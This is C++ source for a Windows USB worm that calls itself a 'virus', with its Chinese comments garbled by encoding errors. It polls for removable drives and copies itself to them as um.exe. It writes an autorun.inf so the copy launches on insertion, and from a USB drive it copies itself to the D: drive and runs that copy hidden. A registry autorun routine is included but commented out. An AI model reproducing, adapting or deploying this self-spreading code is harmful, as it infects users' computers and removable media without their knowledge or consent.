#include <windows.h>
#include <Shlwapi.h>
#include <fstream>
#include <TlHelp32.h>
using namespace std;
#define TIMER 1//��ʱ��
#define WM_FROMC WM_USER+0//�Զ�����Ϣ����C��������
#define WM_FROMU WM_USER+1//�Զ�����Ϣ����U��������

//function 
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);//���ڹ���


//������U������ʱ�õ��ĺ���
BOOL FileExist(TCHAR *path);//����һ���ļ��Ƿ����
BOOL GetSelfPath(TCHAR *path);//Get the virus"s path
BOOL FindU(TCHAR *u);//check whether u exist, u[2]
BOOL GetSysPath(TCHAR *path);//�õ�ϵͳ·��
BOOL CopyToSysAndSet(HWND hwnd);//��������ϵͳĿ¼������
BOOL SetFileAttrib(TCHAR *path);//����path��ָ�ļ�������
//BOOL RegAutoRun(TCHAR *path);//�޸�ע���ʵ��������

//��C������ʱ�õ�����
BOOL CopyToUAndSet();//�����Լ���U��
BOOL CreateAutoRunFile(TCHAR *path);//��U��������autorun.inf�ļ�
BOOL FindSelf();//�����Լ��Ƿ����Ѿ�ִ����

//global variable
TCHAR szExePath[MAX_PATH];//the virus"s path
TCHAR U[2];//����U�̵��̷�
TCHAR szSysPath[MAX_PATH];//system path

//constant 
const TCHAR *szExeName="um.exe";
const TCHAR *szAutoRunFile="AutoRun.inf";

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR  szCmdLine, int iCmdShow)
{
	static TCHAR szAppName[]=TEXT ("virus");
	HWND hwnd;
	MSG msg;
	WNDCLASS wndclass;

	wndclass.style=0;
	wndclass.lpfnWndProc=WndProc;
	wndclass.cbClsExtra=0;
	wndclass.cbWndExtra=0;
	wndclass.hInstance=hInstance;
	wndclass.hIcon=0;
	wndclass.hCursor=0;
	wndclass.hbrBackground=0;
	wndclass.lpszMenuName=NULL;
	wndclass.lpszClassName=szAppName;
	if (!RegisterClass (&wndclass))
	{
		MessageBox (NULL,TEXT("Program requires Windows NT!"),szAppName,MB_ICONERROR);
		return 0;
	}
	hwnd = CreateWindow (szAppName, NULL,WS_DISABLED,0,0,0,0,NULL, NULL,hInstance, NULL);

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage (&msg);
		DispatchMessage (&msg);
	}
	return msg.wParam;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam,LPARAM  lParam)
{
	switch(message)
	{
		// ����һЩҪ����Ҫ�õ���ȫ�ֱ���
		case WM_CREATE:
			GetSysPath(szSysPath);//�õ�ϵͳ·��
			SetTimer(hwnd,TIMER,5000,NULL);//������ʱ��
			GetSelfPath(szExePath);//�õ������·��
			return 0;
		//timer message 
		case WM_TIMER:
			if(szExePath[0]=='D')
			{
				if(FindU(U))
				{
					SendMessage(hwnd,WM_FROMC,0,0);
				}

			}
			else
				SendMessage(hwnd,WM_FROMU,0,0);
			return 0;

		case WM_FROMC:
			CopyToUAndSet();
			return 0;

		case WM_FROMU:
			CopyToSysAndSet(hwnd);
			return 0;

		case WM_DESTROY:
			KillTimer(hwnd,TIMER);
			PostQuitMessage(0);
			return 0;
	}
	return ::DefWindowProc(hwnd, message, wParam, lParam);
}

BOOL GetSelfPath(TCHAR *path)
{
	if(GetModuleFileName(NULL,path,MAX_PATH))//�õ����������Ŀ¼
	{
		return TRUE;
	}
	else 
	{
		return FALSE;
	}
}

BOOL FindU(TCHAR *u)
{
	u[1]=':';
	for(char d='C';d<='Z';d++)//����C��Z
	{
		u[0]=d;
		if(GetDriveType(u)==DRIVE_REMOVABLE)//�ж��ǲ��ǿ��ƶ�����
				return TRUE;
	}
	return FALSE;
} 

BOOL GetSysPath(TCHAR *path)
{
	return GetSystemDirectory(path,MAX_PATH);//�õ�ϵͳ·��
}

BOOL CopyToSysAndSet(HWND hwnd)
	{ 
	TCHAR szPath[MAX_PATH];
	lstrcpy(szPath,"d:");
	lstrcat(szPath,"\\");
	lstrcat(szPath,szExeName);//�õ����Ƶ�ϵͳĿ¼������Ŀ¼
	if(!FileExist(szPath))//����Ƿ��Ѿ����ڸ��Ƶ��ļ�
	{
		CopyFile(szExePath,szPath,FALSE);
		//RegAutoRun(szPath);
		return SetFileAttrib(szPath);
	}
	else
	{
		if(!FindSelf())//����Լ���û������
		WinExec(szPath,SW_HIDE);//û�о�ִ��
		//WinExec(szPath,SW_HIDE);
		//SendMessage(hwnd,WM_CLOSE,0,0);//�����Լ�
	}
	return FALSE;
}

BOOL FileExist(TCHAR *path)//���PATH��ָ��·�����ļ��Ƿ����
{
	int result;
	result=PathFileExists(path);
	return (BOOL)(result);
}

BOOL SetFileAttrib(TCHAR *path)
{
	return SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL);
}

BOOL RegAutoRun(TCHAR *path)//�޸�ע���
{
	/*
	HKEY hkey;
	if(RegOpenKey (HKEY_LOCAL_MACHINE,"SOFTWARE\\MICROSOFT\\Windows\\CurrentVersion\\Run", &hkey)==ERROR_SUCCESS)
	{
		RegSetvalueEx(hkey,szExeName,0,REG_SZ,(BYTE*)path,lstrlen(path));
		RegCloseKey(hkey);
		return TRUE;
	}
	else 
	{
		return FALSE;
	}
	*/
	return TRUE;
}

BOOL CopyToUAndSet()
{
	TCHAR szPath[MAX_PATH];
	lstrcpy(szPath,U);
	lstrcat(szPath,"\\");
	lstrcat(szPath,szExeName);//�õ�ָ��U�̵�����Ŀ¼

	TCHAR szAutoFile[MAX_PATH];
	lstrcpy(szAutoFile,U);
	lstrcat(szAutoFile,"\\");
	lstrcat(szAutoFile,szAutoRunFile);

	//if(!FileExist(szAutoFile))
	//{
	CreateAutoRunFile(szAutoFile);
	SetFileAttrib(szAutoFile);
	//}
	if(!FileExist(szPath))
	{
		CopyFile(szExePath,szPath,FALSE);
		return SetFileAttrib(szPath);
	}
	MessageBox (NULL, "��Ա", "����", MB_OK); 
	return FALSE;
}

BOOL CreateAutoRunFile(TCHAR *path) //��U���´���һ��autorun.inf�ļ�
{
	ofstream fout;
	fout.open(path);
	if(fout)
	{
		fout<<"[AutoRun]"<<endl;
		fout<<"open=um.exe e"<<endl;
		fout<<"shellexecute=um.exe e"<<endl;
		fout<<"shell\\Auto\\command=um.exe e"<<endl;
		//fout<<"shell=Auto"<<endl;
		fout.close();
		return TRUE;
	}
	return FALSE;
}

BOOL FindSelf()
{
	PROCESSENTRY32 pe;
	HANDLE hShot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pe.dwSize=sizeof(PROCESSENTRY32);
	if(Process32First(hShot,&pe))
	{
		do
		{
			if(lstrcmp(pe.szExeFile,szExeName)==0)
			{
				CloseHandle(hShot);
				return TRUE;
			}
		}
		while(Process32Next(hShot,&pe));
	}
	CloseHandle(hShot);
	return FALSE;
}
